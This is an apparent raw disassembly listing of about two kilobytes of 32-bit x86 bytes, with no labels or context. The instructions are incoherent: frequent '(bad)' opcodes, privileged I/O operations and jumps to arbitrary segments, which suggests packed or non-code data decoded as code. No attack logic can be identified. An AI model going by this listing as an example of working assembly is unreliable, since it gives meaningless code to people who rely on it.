  41824d:	and    DWORD PTR [edi-0x14],eax
  418250:	cmp    BYTE PTR [edi+0x60],bh
  418253:	cmp    eax,0xcabd720b
  418258:	fidivr DWORD PTR [ebx]
  41825a:	jg     0x4182a9
  41825c:	xchg   edx,eax
  41825d:	xor    bh,BYTE PTR [ecx-0x7a6f8726]
  418263:	mov    cl,0xf
  418265:	repnz mov ebp,0x7682f90c
  41826b:	stos   BYTE PTR es:[edi],al
  41826c:	or     BYTE PTR [ecx+0x3],bh
  41826f:	div    DWORD PTR [edi-0x4b1c5d97]
  418275:	je     0x418243
  418277:	scas   eax,DWORD PTR es:[edi]
  418278:	das    
  418279:	sbb    cl,BYTE PTR [ebp-0x40c3e5e2]
  41827f:	mov    DWORD PTR [edx+eax*4-0x48ef023e],ecx
  418286:	xor    DWORD PTR [edi+0x1c],esi
  418289:	aas    
  41828a:	shr    BYTE PTR [eax+0x1035fe22],cl
  418290:	shl    edi,1
  418292:	aas    
  418293:	ds dec esi
  418295:	data16 cmp BYTE PTR [ebp-0x58],0x9
  41829a:	rol    ah,1
  41829c:	or     ch,al
  41829e:	iret   
  41829f:	(bad)  
  4182a0:	out    dx,al
  4182a1:	test   BYTE PTR gs:[esi],al
  4182a4:	cmp    eax,0x3e14e6ac
  4182a9:	cdq    
  4182aa:	dec    edi
  4182ab:	jg     0x418329
  4182ad:	xchg   esi,eax
  4182ae:	jp     0x418294
  4182b0:	mov    ch,0xce
  4182b2:	stos   BYTE PTR es:[edi],al
  4182b3:	mov    ds:0x3df4364c,eax
  4182b8:	jmp    0x644ad264
  4182bd:	arpl   dx,sp
  4182bf:	xor    al,0x7d
  4182c1:	imul   ecx,DWORD PTR [ecx-0x8874d91],0xffffffb5
  4182c8:	and    BYTE PTR [ecx+edi*2+0xafef566],ch
  4182cf:	pop    ds
  4182d0:	int    0x47
  4182d2:	mov    dh,0x2b
  4182d4:	jmp    0xdb18:0x645569b3
  4182db:	xor    dl,0x8e
  4182de:	mov    eax,0x14ae6a3a
  4182e3:	add    BYTE PTR [edi+eiz*2+0x1f],ah
  4182e7:	loop   0x4182ef
  4182e9:	adc    edx,ecx
  4182eb:	cli    
  4182ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182ed:	sub    ecx,ebp
  4182ef:	adc    ebp,DWORD PTR [edi-0x4c]
  4182f2:	mov    al,ds:0x245ae660
  4182f8:	xor    BYTE PTR ds:0xde707f86,0xcf
  4182ff:	jne    0x418310
  418301:	mov    ds:0x1adb54d8,eax
  418306:	sub    al,0x9f
  418308:	fstp   QWORD PTR [edi]
  41830a:	or     edi,DWORD PTR [ebp+eax*1+0x46]
  41830e:	jno    0x418334
  418310:	add    ah,BYTE PTR [ecx]
  418312:	outs   dx,DWORD PTR ds:[esi]
  418313:	dec    ecx
  418314:	and    al,BYTE PTR [eax+0x35]
  418317:	fs and al,0x5d
  41831a:	jns    0x418368
  41831c:	stos   BYTE PTR es:[edi],al
  41831d:	fadd   DWORD PTR [edx+0x46713202]
  418323:	mov    eax,ds:0xfae6d352
  418328:	(bad)  
  418329:	clc    
  41832a:	sti    
  41832b:	pop    ds
  41832c:	jp     0x4182f1
  41832e:	outs   dx,DWORD PTR ds:[esi]
  41832f:	push   cs
  418330:	jge    0x418394
  418332:	sbb    dh,cl
  418334:	daa    
  418335:	mov    al,ds:0xa6a32ce6
  41833a:	lods   al,BYTE PTR ds:[esi]
  41833b:	stc    
  41833c:	mov    BYTE PTR [ecx-0x73],0x66
  418340:	or     DWORD PTR [ebp+0x17],edx
  418343:	jge    0x418360
  418345:	inc    ebp
  418346:	dec    eax
  418347:	fwait
  418348:	cli    
  418349:	data16 addr16 jg 0x4183ab
  41834d:	sub    al,0xe4
  41834f:	(bad)
  418352:	and    DWORD PTR [edi],esp
  418354:	inc    ecx
  418355:	les    esi,FWORD PTR [edi]
  418357:	repnz xchg ebp,eax
  418359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41835a:	jp     0x4183c7
  41835c:	dec    eax
  41835d:	jp     0x418365
  41835f:	mov    ebx,0x763f7104
  418364:	ins    DWORD PTR es:[edi],dx
  418365:	jmp    0x28fd5812
  41836a:	cmp    esp,DWORD PTR [esi-0x47fd71ae]
  418370:	imul   esi,DWORD PTR [ebp+ecx*8-0x1c],0x27d3b176
  418378:	loopne 0x4183cc
  41837a:	mov    BYTE PTR [ebx-0x9bd6feb],ah
  418380:	push   ebx
  418381:	add    DWORD PTR [esp+edx*2],edi
  418384:	sar    BYTE PTR [ecx+0x7d],1
  418387:	pop    ebx
  418388:	daa    
  418389:	jge    0x4183d7
  41838b:	inc    ecx
  41838c:	xchg   DWORD PTR [ecx],ebp
  41838e:	push   ss
  41838f:	mov    ?,WORD PTR [edi-0x71181ac1]
  418395:	inc    esi
  418396:	sbb    BYTE PTR [ecx+edx*8],0x8a
  41839a:	mov    esp,0x8333e866
  41839f:	test   al,0x28
  4183a1:	int3   
  4183a2:	loop   0x418348
  4183a4:	adc    BYTE PTR [edi],ah
  4183a6:	stos   DWORD PTR es:[edi],eax
  4183a7:	or     bl,0x1c
  4183aa:	cmp    DWORD PTR [edi-0x67],edi
  4183ad:	or     al,0xc4
  4183af:	fmul   QWORD PTR [edi+0x41]
  4183b2:	sub    ebp,DWORD PTR [ebx]
  4183b4:	xchg   ebx,eax
  4183b5:	mov    ch,0x5c
  4183b7:	xor    ah,dh
  4183b9:	sbb    al,0xf5
  4183bb:	sub    dh,BYTE PTR [edx-0x4c]
  4183be:	addr16 retf 0xdc6
  4183c2:	loopne 0x41840e
  4183c4:	into   
  4183c5:	mov    ss,WORD PTR [edx+0x59]
  4183c8:	scas   al,BYTE PTR es:[edi]
  4183c9:	mov    eax,0xce86fd8f
  4183ce:	inc    esi
  4183cf:	or     BYTE PTR [esi-0x1791ea37],bl
  4183d5:	mov    BYTE PTR [ecx+0x4a],al
  4183d8:	retf   0x3c1e
  4183db:	mul    esi
  4183dd:	add    eax,0x4c16f44d
  4183e2:	loop   0x41843b
  4183e4:	stos   DWORD PTR es:[edi],eax
  4183e5:	mov    esp,eax
  4183e7:	icebp  
  4183e8:	mov    bl,BYTE PTR ds:0x361525ba
  4183ee:	sub    cl,0x5e
  4183f1:	mov    al,ds:0xd393cb3f
  4183f6:	loopne 0x41843e
  4183f8:	cwde   
  4183f9:	or     edi,DWORD PTR [ebx+0x40]
  4183fc:	sbb    dh,BYTE PTR [edx]
  4183fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183ff:	mov    dh,BYTE PTR [edi]
  418401:	add    esi,DWORD PTR [eax+esi*2-0x69]
  418405:	imul   ecx,DWORD PTR [ecx-0x4d],0x51c72af9
  41840c:	or     eax,0x95025e14
  418411:	pop    ds
  418412:	test   cl,ch
  418414:	outs   dx,DWORD PTR ds:[esi]
  418415:	xor    BYTE PTR [ecx-0x36],al
  418418:	inc    ebp
  418419:	push   cs
  41841a:	mov    esi,0x665cd9b3
  41841f:	sahf   
  418420:	pusha  
  418421:	xor    DWORD PTR [ebp-0xd],ebp
  418424:	adc    esi,edi
  418426:	(bad)  
  418427:	(bad)  [ecx+0x73302c9d]
  41842d:	jle    0x41842f
  41842f:	retf   0x4b56
  418432:	dec    ebp
  418433:	mov    ebx,0x8a0af953
  418438:	xchg   ecx,eax
  418439:	adc    eax,0xf406df8a
  41843e:	and    edx,edi
  418440:	xchg   ebx,eax
  418441:	sub    DWORD PTR [edi+0x0],edi
  418444:	psrlq  mm5,QWORD PTR fs:[edx-0x64]
  418449:	ds jge 0x4183d6
  41844c:	lea    esi,[eax+0x1d]
  41844f:	sar    DWORD PTR cs:[eax+0x58],1
  418453:	out    0x7d,eax
  418455:	outs   dx,BYTE PTR ds:[esi]
  418456:	lods   al,BYTE PTR ds:[esi]
  418457:	sbb    cl,BYTE PTR [ecx+0x1]
  41845a:	mov    bl,BYTE PTR [ebx+0x278de56c]
  418460:	or     ebp,ebp
  418462:	jne    0x4183f1
  418464:	ins    DWORD PTR es:[edi],dx
  418465:	sbb    DWORD PTR [ecx],ebx
  418467:	scas   al,BYTE PTR es:[edi]
  418468:	add    dh,BYTE PTR [edx-0x681d3b60]
  41846e:	sbb    ebx,esp
  418470:	sahf   
  418471:	bound  esi,QWORD PTR es:[ebx+0x1c68dc]
  418478:	call   0x6c7:0xee7df49e
  41847f:	ja     0x41841f
  418481:	jg     0x41845a
  418483:	test   eax,0x9415cc61
  418488:	int    0x45
  41848a:	and    cl,BYTE PTR [esi-0x9430528]
  418490:	(bad)
  418494:	sbb    DWORD PTR [ebp+0x39b49a05],ebp
  41849a:	or     al,0xd1
  41849c:	mov    edi,0xcfc8915a
  4184a1:	or     al,0x99
  4184a3:	loope  0x4184a4
  4184a5:	cs mov edx,0x2f2430c6
  4184ab:	icebp  
  4184ac:	cli    
  4184ad:	fidivr DWORD PTR [ecx-0x9]
  4184b0:	add    BYTE PTR [edi+ebp*1],al
  4184b3:	sub    ah,al
  4184b5:	and    al,BYTE PTR [edi-0x54]
  4184b8:	xor    al,0x3e
  4184ba:	push   ss
  4184bb:	adc    al,0x35
  4184bd:	mov    dh,0xa9
  4184bf:	mov    al,0x83
  4184c1:	mov    esp,0xfcb8ed28
  4184c6:	shl    BYTE PTR cs:[esi],cl
  4184c9:	test   DWORD PTR [eax+0x40a1e8f1],edi
  4184cf:	mov    edi,0x366ada35
  4184d4:	fwait
  4184d5:	pop    edx
  4184d6:	jge    0x4184f0
  4184d8:	and    ebp,esi
  4184da:	stos   DWORD PTR es:[edi],eax
  4184db:	mov    edx,0x7ef0e557
  4184e0:	mov    DWORD PTR [edx+ecx*4-0x32],edi
  4184e4:	sbb    eax,DWORD PTR [edx]
  4184e6:	fdivr  QWORD PTR [edi]
  4184e8:	stc    
  4184e9:	hlt    
  4184ea:	lock xor DWORD PTR [edx-0x2171b77d],edi
  4184f1:	or     al,0x4e
  4184f3:	pop    ecx
  4184f4:	cmp    al,0x18
  4184f6:	push   cs
  4184f7:	mov    eax,DWORD PTR [edx+0x16]
  4184fa:	pop    ss
  4184fb:	in     al,0xe8
  4184fd:	(bad)  
  4184fe:	mov    bh,0xc3
  418500:	out    dx,eax
  418501:	sbb    ebp,DWORD PTR [edx+0x3c]
  418504:	mov    dh,BYTE PTR [ecx]
  418506:	in     al,0x8a
  418508:	dec    esi
  418509:	in     eax,dx
  41850a:	xor    bl,bh
  41850c:	cwde   
  41850d:	iret   
  41850e:	mov    BYTE PTR [ecx-0x2ce37ff8],dh
  418514:	and    DWORD PTR [edx],eax
  418516:	xchg   ecx,eax
  418517:	test   esp,0x4431cd14
  41851d:	iret   
  41851e:	jge    0x418574
  418520:	xor    eax,0xd9ab408f
  418525:	call   0x371b972
  41852a:	mov    dh,0xac
  41852c:	bound  esp,QWORD PTR [edx+eax*2+0x59]
  418530:	mov    esp,0x25a40a4b
  418535:	push   ebx
  418536:	les    edi,FWORD PTR [edi]
  418538:	push   ebp
  418539:	imul   edx,DWORD PTR [ecx+0x2f],0xffffffcb
  41853d:	jnp    0x418594
  41853f:	adc    ecx,DWORD PTR [ebp-0x364f067]
  418545:	and    DWORD PTR [ebp-0x70],esi
  418548:	jae    0x418564
  41854a:	fbld   TBYTE PTR [edi]
  41854c:	leave  
  41854d:	sub    cl,BYTE PTR [ebx-0x444202ee]
  418553:	add    bh,dl
  418555:	sub    ch,dh
  418557:	sbb    esp,ebx
  418559:	adc    eax,0x13dfb58b
  41855e:	fwait
  41855f:	sahf   
  418560:	mov    WORD PTR [edi-0x39122f8e],es
  418566:	sbb    ah,BYTE PTR [ecx]
  418568:	fst    DWORD PTR [edi-0x34]
  41856b:	mov    dl,0x57
  41856d:	je     0x41853a
  41856f:	jb     0x418568
  418571:	jecxz  0x4185eb
  418573:	mov    ch,0xb4
  418575:	mov    esp,0xb8d09f39
  41857a:	jo     0x41850a
  41857c:	(bad)  
  41857d:	mov    dh,0xa1
  41857f:	out    0xa8,eax
  418581:	pop    ds
  418582:	stc    
  418583:	bnd jle 0x4185d6
  418586:	aam    0x64
  418588:	jl     0x4185c8
  41858a:	scas   eax,DWORD PTR es:[edi]
  41858b:	icebp  
  41858c:	inc    eax
  41858d:	xor    al,0x7b
  41858f:	outs   dx,DWORD PTR ds:[esi]
  418590:	fisttp QWORD PTR [ecx+0x74]
  418593:	iret   
  418594:	fild   DWORD PTR [ecx+0x6c003c5a]
  41859a:	mov    esp,0xcc0d212b
  41859f:	dec    edx
  4185a0:	xchg   ecx,eax
  4185a1:	xchg   ecx,eax
  4185a2:	mov    bh,0xd9
  4185a4:	lods   eax,DWORD PTR ds:[esi]
  4185a5:	mul    DWORD PTR [esi]
  4185a7:	and    esi,edx
  4185a9:	(bad)  
  4185aa:	loopne 0x4185f3
  4185ac:	mov    eax,0x54d69c61
  4185b1:	dec    eax
  4185b2:	pop    edi
  4185b3:	adc    edi,DWORD PTR [ecx+ecx*2-0x2300c9bf]
  4185ba:	add    esp,DWORD PTR [ebx-0x7cf1ef6a]
  4185c0:	int3   
  4185c1:	inc    ecx
  4185c2:	sbb    BYTE PTR ds:0xe5174065,0xbd
  4185c9:	mov    ebp,0x7137858
  4185ce:	adc    dh,BYTE PTR [eax-0x121b00d5]
  4185d4:	(bad)  
  4185d5:	push   ss
  4185d6:	sub    dh,BYTE PTR [ecx+esi*4]
  4185d9:	gs imul esi,ebp,0x36
  4185dd:	xlat   BYTE PTR ds:[ebx]
  4185de:	mov    bl,0x70
  4185e0:	mov    ecx,0x89ab9ecc
  4185e5:	sar    ah,1
  4185e7:	pop    edx
  4185e8:	inc    ebp
  4185e9:	jbe    0x418641
  4185eb:	mov    ds:0x80f677b5,al
  4185f0:	push   es
  4185f1:	mov    ecx,0x9e3faa62
  4185f6:	rcl    esp,1
  4185f8:	rol    DWORD PTR [edi],1
  4185fa:	ret    
  4185fb:	push   edx
  4185fc:	std    
  4185fd:	sub    edi,eax
  4185ff:	call   DWORD PTR [ebx+0x66d4a22e]
  418605:	mov    eax,ds:0xca82c46f
  41860a:	lock std 
  41860c:	std    
  41860d:	mov    bl,0xcf
  41860f:	test   eax,0x58720580
  418614:	inc    ecx
  418615:	(bad)  
  418616:	fild   QWORD PTR [eax]
  418618:	icebp  
  418619:	dec    esp
  41861a:	aam    0x80
  41861c:	dec    eax
  41861d:	stos   BYTE PTR es:[edi],al
  41861e:	xchg   ebp,eax
  41861f:	pop    ebp
  418620:	das    
  418621:	das    
  418622:	test   eax,0x4e601c08
  418627:	shr    BYTE PTR [ecx+ebx*8-0x59a52bb8],0xf
  41862f:	mov    es,WORD PTR [eax-0x2]
  418632:	ins    DWORD PTR es:[edi],dx
  418633:	sub    DWORD PTR [ecx-0x7b],esp
  418636:	add    al,0xeb
  418638:	nop
  418639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41863a:	rol    BYTE PTR [ebx],1
  41863c:	pop    ebp
  41863d:	sbb    eax,0x7082c3de
  418642:	jl     0x41869b
  418644:	adc    bl,BYTE PTR [eax]
  418646:	aam    0xee
  418648:	jl     0x418650
  41864a:	cmc    
  41864b:	in     eax,dx
  41864c:	ret    0x2617
  41864f:	dec    DWORD PTR ss:[esi+0x20]
  418653:	push   esi
  418654:	inc    esp
  418655:	in     eax,0x1a
  418657:	sbb    ah,BYTE PTR [eax+0x7b]
  41865a:	xor    DWORD PTR [edx-0x20],esp
  41865d:	aad    0x6b
  41865f:	sbb    al,0x7f
  418661:	js     0x418633
  418663:	sub    eax,0x8c0f4d16
  418668:	mov    ecx,0xbc84ed3e
  41866d:	inc    edi
  41866e:	mov    ds:0xeca7857e,eax
  418673:	fs and eax,0x772caae8
  418679:	fcom   QWORD PTR [esi]
  41867b:	mov    ebp,0x161683a8
  418680:	mov    edx,0xfe578d8c
  418685:	call   0xaa96:0x86e5a037
  41868c:	stc    
  41868d:	mov    edx,0x19ed2891
  418692:	ins    DWORD PTR es:[edi],dx
  418693:	push   edi
  418694:	push   esp
  418695:	popf   
  418696:	xor    eax,0x16f1ff20
  41869b:	mov    BYTE PTR [ebx-0x5f2be4b4],al
  4186a1:	das    
  4186a2:	(bad)  
  4186a4:	jb     0x418706
  4186a6:	add    BYTE PTR [edx+0x1a],ah
  4186a9:	push   DWORD PTR [esp]
  4186ac:	sbb    DWORD PTR [eax+esi*2],edi
  4186af:	pop    edi
  4186b0:	sti    
  4186b1:	mov    dl,0x6c
  4186b3:	xchg   dh,al
  4186b5:	(bad)  
  4186b6:	jmp    0x41869a
  4186b8:	cmp    DWORD PTR [esi],esp
  4186ba:	push   edi
  4186bb:	test   DWORD PTR [ebx+ebp*8],ebx
  4186be:	out    dx,al
  4186bf:	xor    eax,0x7623412f
  4186c4:	out    0x7d,al
  4186c6:	jbe    0x41867b
  4186c8:	adc    BYTE PTR [eax-0x7c],bh
  4186cb:	push   edi
  4186cc:	fbstp  TBYTE PTR [edx-0x4f]
  4186cf:	mov    eax,ds:0x147c0348
  4186d4:	add    DWORD PTR [edi-0x72301040],eax
  4186da:	sbb    ch,BYTE PTR [eax]
  4186dc:	ss mov dh,0xfe
  4186df:	and    BYTE PTR [eax-0x3dcb84f0],0xd6
  4186e6:	xor    DWORD PTR [ecx],ecx
  4186e8:	call   0xe78fff80
  4186ed:	sub    ecx,esp
  4186ef:	sbb    eax,0x6668a634
  4186f4:	push   0x3f
  4186f6:	lea    edx,[edx+0x4fb671df]
  4186fc:	jmp    0x41874d
  4186fe:	mov    al,BYTE PTR [edi+0x66]
  418701:	push   0xffffff94
  418703:	jae    0x41874e
  418705:	dec    esi
  418706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418707:	jns    0x418699
  418709:	(bad)  
  41870a:	lock inc esi
  41870c:	ins    DWORD PTR es:[edi],dx
  41870d:	inc    ebx
  41870e:	clc    
  41870f:	or     ah,bl
  418711:	ins    DWORD PTR es:[edi],dx
  418712:	inc    eax
  418713:	repnz pop ebx
  418715:	fmul   QWORD PTR [ecx-0x14]
  418718:	retf   
  418719:	xchg   ah,bh
  41871b:	xchg   ebx,eax
  41871c:	dec    edi
  41871d:	jg     0x4186e0
  41871f:	adc    eax,0xebe9c910
  418724:	or     BYTE PTR [esi-0x3d5a3242],ah
  41872a:	aam    0xed
  41872c:	pushf  
  41872d:	sub    eax,0x12ad1ae5
  418732:	xor    BYTE PTR [eax],ch
  418734:	jno    0x418796
  418736:	jecxz  0x4186c6
  418738:	xor    DWORD PTR [ecx],edi
  41873a:	sbb    DWORD PTR [edx-0x1],eax
  41873d:	inc    edx
  41873e:	imul   edi,DWORD PTR [edi-0x3537e4b0],0x4b50e49d
  418748:	jb     0x4186d4
  41874a:	mov    ebp,DWORD PTR [ebp+0x6e]
  41874d:	add    BYTE PTR [edx+0x3a],0xbe
  418751:	or     edx,ecx
  418753:	outs   dx,BYTE PTR ds:[esi]
  418754:	call   0x44a1:0xf17e31ec
  41875b:	or     bh,bh
  41875d:	cli    
  41875e:	ror    BYTE PTR [esi+0x17],0x57
  418762:	out    dx,eax
  418763:	out    0x6d,al
  418765:	sbb    ecx,DWORD PTR ds:[ecx-0x2f79f0b0]
  41876c:	rcr    DWORD PTR [edi-0x482b9cc9],1
  418772:	inc    esi
  418773:	lahf   
  418774:	xor    eax,0x587ab222
  418779:	push   es
  41877a:	sbb    edi,0x186e4849
  418780:	pop    ecx
  418781:	sbb    edi,eax
  418783:	retf   0x665d
  418786:	loopne 0x418763
  418788:	xor    bl,BYTE PTR [edx+0x5e]
  41878b:	push   cs
  41878c:	sbb    DWORD PTR [ebp-0x1c],eax
  41878f:	sub    cl,BYTE PTR ds:0x67df1aff
  418795:	stos   DWORD PTR es:[edi],eax
  418796:	and    BYTE PTR ds:[edi],dh
  418799:	xor    DWORD PTR [edi-0x5b],ebx
  41879c:	fs dec eax
  41879e:	and    BYTE PTR [eax],ah
  4187a0:	test   ebp,ebp
  4187a2:	push   edx
  4187a3:	adc    al,0xc0
  4187a5:	mov    ebx,0x4e0031cc
  4187aa:	push   edx
  4187ab:	and    dh,dl
  4187ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187ae:	aas    
  4187af:	jns    0x418764
  4187b1:	or     al,0x1f
  4187b3:	imul   edx,DWORD PTR [ebx],0xa69dd8c2
  4187b9:	jb     0x418785
  4187bb:	or     eax,0x714f4c87
  4187c0:	jecxz  0x4187bf
  4187c2:	dec    edi
  4187c3:	xor    al,0xd7
  4187c5:	adc    bh,BYTE PTR [ebx-0x37]
  4187c8:	push   ebx
  4187c9:	loopne 0x418779
  4187cb:	outs   dx,DWORD PTR ds:[esi]
  4187cc:	mov    esp,0x375abc52
  4187d1:	(bad)  
  4187d2:	out    dx,al
  4187d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187d4:	arpl   WORD PTR [edi],si
  4187d6:	or     esp,DWORD PTR [edi+0x22]
  4187d9:	les    eax,FWORD PTR [edx-0x25540222]
  4187df:	pop    ds
  4187e0:	les    esi,FWORD PTR [eax+0xe]
  4187e3:	(bad)  [eax-0x65]
  4187e6:	dec    esp
  4187e7:	out    dx,eax
  4187e8:	test   eax,0x1e131c2c
  4187ed:	add    dh,dh
  4187ef:	icebp  
  4187f0:	lds    eax,FWORD PTR [ebp-0x13253900]
  4187f6:	push   esp
  4187f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187f8:	jae    0x4187be
  4187fa:	mov    DWORD PTR [edx-0x2e],ecx
  4187fd:	in     al,0x71
  4187ff:	iret   
  418800:	xor    al,0xe3
  418802:	fwait
  418803:	or     BYTE PTR [ecx+0x7690294e],bl
  418809:	test   al,0x60
  41880b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41880c:	test   al,0xd6
  41880e:	cld    
  41880f:	add    eax,0xee4ecb83
  418814:	jmp    0x344a:0xd0750ee8
  41881b:	(bad)  
  41881c:	mov    eax,ds:0xdb70f6e3
  418821:	ins    DWORD PTR es:[edi],dx
  418822:	or     DWORD PTR [esi+0x4c4a05c3],0xa
  418829:	push   edi
  41882a:	(bad)
  41882d:	fnstenv [ecx+0x53]
  418830:	mov    fs,WORD PTR [eax-0x5e39a3bd]
  418836:	int    0xd4
  418838:	adc    DWORD PTR [edi+0x97bf3c4],0xa093790a
  418842:	data16 mov gs,WORD PTR [eax+0x12]
  418846:	test   al,0x26
  418848:	mov    eax,ds:0x2087f112
  41884d:	add    al,0x4e
  41884f:	dec    esi
  418850:	imul   esp,DWORD PTR [ecx-0x5ae7c575],0xffffffe8
  418857:	fisub  WORD PTR [esi-0x69]
  41885a:	dec    ebp
  41885b:	xlat   BYTE PTR ds:[ebx]
  41885c:	ins    DWORD PTR es:[edi],dx
  41885d:	and    eax,edi
  41885f:	xlat   BYTE PTR ds:[ebx]
  418860:	(bad)  
  418861:	ret    
  418862:	je     0x418893
  418864:	jle    0x418818
  418866:	jmp    0x41888a
  418868:	in     al,dx
  418869:	jb     0x418884
  41886b:	ja     0x418889
  41886d:	inc    esi
  41886f:	pop    ds
  418870:	jbe    0x4188bd
  418872:	jno    0x4188ab
  418874:	and    edi,esi
  418876:	add    al,0xfb
  418878:	sub    al,0x73
  41887a:	ja     0x4188b1
  41887c:	ffreep st(1)
  41887e:	sbb    BYTE PTR ds:0xe71b63a6,bh
  418884:	dec    edx
  418885:	mov    edx,0xf1469aa
  41888a:	xor    eax,0xcf389b2
  41888f:	std    
  418890:	mov    ecx,esp
  418892:	dec    edi
  418893:	(bad)
  418896:	xchg   esi,eax
  418897:	mov    DWORD PTR [esi+0x41b6f86b],edi
  41889d:	lock imul edi,DWORD PTR [esi-0x52f790a0],0xf9c6230d
  4188a8:	pushf  
  4188a9:	fbld   TBYTE PTR [esi]
  4188ab:	mov    dl,0x28
  4188ad:	call   0x5ba0:0x6e25d174
  4188b4:	dec    edi
  4188b5:	xchg   ecx,eax
  4188b6:	inc    ebp
  4188b7:	xlat   BYTE PTR ds:[ebx]
  4188b8:	adc    al,0x5c
  4188ba:	loopne 0x4188b3
  4188bc:	mov    ss,WORD PTR [eax+0x17]
  4188bf:	out    0x95,eax
  4188c1:	nop
  4188c2:	add    eax,0x76ebeb2d
  4188c7:	add    al,0xfa
  4188c9:	call   esi
  4188cb:	push   cs
  4188cc:	sti    
  4188cd:	sbb    DWORD PTR [edi-0x3ff254a3],0xe4f68e0e
  4188d7:	fcomi  st,st(1)
  4188d9:	or     al,0x26
  4188db:	mov    bh,cl
  4188dd:	and    esi,DWORD PTR [ebp+0x6a]
  4188e0:	xor    al,0x78
  4188e2:	shl    DWORD PTR [ebp-0x4a970ea3],1
  4188e8:	inc    ecx
  4188e9:	pushf  
  4188ea:	retf   0xbdc6
  4188ed:	cwde   
  4188ee:	xor    eax,0x269f06f3
  4188f3:	mov    bh,0xe1
  4188f5:	cmp    esp,DWORD PTR [esi]
  4188f7:	cs mov eax,esp
  4188fa:	jbe    0x4188ac
  4188fc:	dec    edi
  4188fd:	sub    al,al
  4188ff:	sbb    esp,ecx
  418901:	psubusb mm0,QWORD PTR [esi+0x24]
  418905:	pop    eax
  418906:	sub    BYTE PTR [ebp-0x2d],dh
  418909:	aas    
  41890a:	and    al,0xbd
  41890c:	lea    ebx,[edi+eiz*2]
  41890f:	xor    al,0x82
  418911:	inc    ebx
  418912:	xchg   esi,eax
  418913:	jmp    0x41898a
  418915:	imul   eax,DWORD PTR [ecx+0x4402f851],0xfffffffd
  41891c:	(bad)  
  41891d:	mov    eax,DWORD PTR [ebp+0x2f35475e]
  418923:	inc    ecx
  418924:	inc    ecx
  418925:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  418927:	fwait
  418928:	push   0xe3e16f44
  41892d:	jp     0x41896a
  41892f:	sub    cl,0x56
  418932:	mov    al,ds:0xabb18d14
  418937:	loope  0x418999
  418939:	mov    BYTE PTR [edx-0x26cf4220],bl
  41893f:	bound  ecx,QWORD PTR [ebp+0x40e7ccc6]
  418945:	push   edx
  418946:	mov    ds:0xf41601ff,al
  41894b:	(bad)  
  41894c:	mov    ds:0x577fbf85,eax
  418951:	xchg   BYTE PTR [edx],ch
  418953:	pop    edx
  418954:	sbb    BYTE PTR [ebp-0x72e6b90f],ah
  41895a:	ror    dh,0x40
  41895d:	dec    ebp
  41895e:	sub    ecx,esp
  418960:	aam    0x23
  418962:	and    DWORD PTR [ebp+0xed285e3],edx
  418968:	push   ebp
  418969:	lods   al,BYTE PTR ds:[esi]
  41896a:	push   edi
  41896b:	sub    esi,ebx
  41896d:	jg     0x41892f
  41896f:	xchg   esi,eax
  418970:	mov    eax,ds:0x9c448999
  418975:	fsubr  DWORD PTR [esi]
  418977:	xor    al,0xa3
  418979:	test   BYTE PTR [ebx-0x687bd797],0xd5
  418980:	imul   ecx,DWORD PTR [ebx],0xffffff83
  418983:	inc    esi
  418984:	mov    ds:0xc68db9ca,eax
  418989:	iret   
  41898a:	cmp    al,0x29
  41898c:	xchg   DWORD PTR [edx],ebp
  41898e:	jae    0x41891d
  418990:	shl    BYTE PTR [ebx+eiz*4-0x11151856],1
  418997:	enter  0x4a71,0x26
  41899b:	fldenv [esi]
  41899d:	xchg   esp,eax
  41899e:	or     eax,0x3f032471
  4189a3:	stos   DWORD PTR es:[edi],eax
  4189a4:	clc    
  4189a5:	xchg   edi,eax
  4189a6:	and    esp,0xdbea5fa9
  4189ac:	xchg   ebx,eax
  4189ad:	mov    edi,0xc80d7232
  4189b2:	fcom   QWORD PTR [esi]
  4189b4:	mov    al,0xc
  4189b6:	test   DWORD PTR [esi+0x2d],ebx
  4189b9:	cmp    ebx,DWORD PTR [esi+0x21]
  4189bc:	pusha  
  4189bd:	or     DWORD PTR [edx+0x36],eax
  4189c0:	fwait
  4189c1:	scas   eax,DWORD PTR es:[edi]
  4189c2:	xchg   ecx,eax
  4189c3:	sbb    edx,DWORD PTR [edx+0x608ce5a9]
  4189c9:	sti    
  4189ca:	mov    esp,0xc52f2e6e
  4189cf:	and    esp,DWORD PTR [ebx+0xdf5db8f]
  4189d5:	jmp    0x418a4e
  4189d7:	ror    BYTE PTR [ecx-0x63],1
  4189da:	ret    
  4189db:	dec    ecx
  4189dc:	mov    ds:0x3293b476,al
  4189e1:	jns    0x418971
  4189e3:	sbb    esp,DWORD PTR ds:0xd839d76
  4189e9:	ret    0xcdad
  4189ec:	jmp    0x418a49
  4189ee:	or     DWORD PTR [ecx],0x40
  4189f1:	dec    edi
  4189f2:	outs   dx,BYTE PTR ds:[esi]
  4189f3:	xlat   BYTE PTR ds:[ebx]
  4189f4:	loope  0x418a20
  4189f6:	clc    
  4189f7:	dec    ebp
  4189f8:	lea    eax,[ebx+0x5c]
  4189fb:	arpl   WORD PTR [esi],bx
  4189fd:	jo     0x4189ae
  4189ff:	push   esp
  418a00:	lock mov al,ds:0x9d57e957
  418a06:	pop    esi
  418a07:	add    BYTE PTR [eax+0x7635143a],cl
  418a0d:	add    BYTE PTR [edi+0x738943e8],dh
  418a13:	sbb    DWORD PTR [eax],esi
  418a15:	(bad)  
  418a16:	(bad)  
  418a18:	or     al,0xa8
  418a1a:	stos   DWORD PTR es:[edi],eax
  418a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a1c:	xchg   esp,eax
  418a1d:	push   ebp
  418a1e:	sar    BYTE PTR [edx],0x93
  418a21:	add    BYTE PTR [eax-0x1],bh
  418a24:	hlt    
  418a25:	adc    eax,DWORD PTR [eax+0x19]
  418a28:	push   ebp
  418a29:	lods   eax,DWORD PTR ds:[esi]
  418a2a:	scas   eax,DWORD PTR es:[edi]
  418a2b:	pop    ss
  418a2c:	cmp    eax,0x5f0998c7
  418a31:	sub    BYTE PTR [eax+0x88e28af],ch
